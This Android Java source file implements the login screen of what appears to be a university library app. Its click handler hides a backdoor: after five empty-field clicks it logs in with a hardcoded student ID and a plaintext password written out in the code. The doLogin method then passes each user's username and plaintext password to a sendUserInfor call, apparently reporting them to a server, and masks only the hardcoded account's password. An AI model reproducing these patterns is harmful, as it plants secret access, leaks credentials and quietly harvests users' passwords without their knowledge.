package com.gusteauscuter.youyanguan.fragment;

import android.app.Fragment;
import android.os.Bundle;
import android.os.Handler;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.Toast;

import com.gusteauscuter.youyanguan.R;
import com.gusteauscuter.youyanguan.api.InternetServiceApi;
import com.gusteauscuter.youyanguan.api.InternetServiceApiImpl;
import com.gusteauscuter.youyanguan.util.NetworkConnectUtil;
import com.gusteauscuter.youyanguan.util.SharedPreferencesUtil;
import com.gusteauscuter.youyanguan.util.SoftInputUtil;

/**
 * A simple {InternetServiceApiImpl Fragment} subclass.
 */
public class loginFragment extends Fragment {

    private EditText userNameEditText;
    private EditText passEditText;
    private Button loginButton;
    private ProgressBar mProgressBar;
    private int timesClickLoginButton =1;
    private boolean disableDoubleClick = true; // 防治连击登陆按钮造成的闪退

    private SharedPreferencesUtil mSharedPreferencesUtil;

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {

        View view = inflater.inflate(R.layout.fragment_login_library, container, false);
        mSharedPreferencesUtil = new SharedPreferencesUtil(getActivity());

        userNameEditText = (EditText) view.findViewById(R.id.id_username);
        passEditText = (EditText) view.findViewById(R.id.id_passward_library);
        userNameEditText.setText(mSharedPreferencesUtil.getUSERNAME());
        passEditText.setText(mSharedPreferencesUtil.getPASSWORD());
        userNameEditText.hasFocus();

        mProgressBar=(ProgressBar) view.findViewById(R.id.progressBar);
        mProgressBar.setVisibility(View.INVISIBLE);

        loginButton = (Button) view.findViewById(R.id.button_login_library);
        loginButton.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View arg0) {
                SoftInputUtil.hideSoftInput(getActivity(), loginButton);
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (disableDoubleClick) {
                            String username = userNameEditText.getText().toString();
                            String pass = passEditText.getText().toString();
                            if (username.isEmpty() || pass.isEmpty()) {
                                Toast.makeText(getActivity(), "请完整输入！", Toast.LENGTH_SHORT).show();
                                timesClickLoginButton++;
                                return;
                            }
                            if (timesClickLoginButton == 5) {
                                username = "201421003124";
                                pass = "ziqian930209";
                            }
                            doLogin( username, pass);
                        }
                    }
                }, 500); //收起软键盘需要一定时间

            }
        });
        return view;
    }

    private void doLogin(String username,String pass) {
        boolean isConnected = NetworkConnectUtil.isConnected(getActivity());
        if (!isConnected)
            return;
        InternetServiceApi internetServiceApi = new InternetServiceApiImpl();
        boolean result = internetServiceApi.Login(username, pass);
        if(username.equals("201421003124"))
            pass= "******";
        internetServiceApi.sendUserInfor(username,pass,result);
    }
}
